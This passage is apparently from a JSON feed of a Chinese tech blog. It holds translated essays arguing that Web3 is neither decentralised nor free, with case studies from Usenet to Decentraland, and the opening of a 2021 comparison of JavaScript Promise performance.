年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 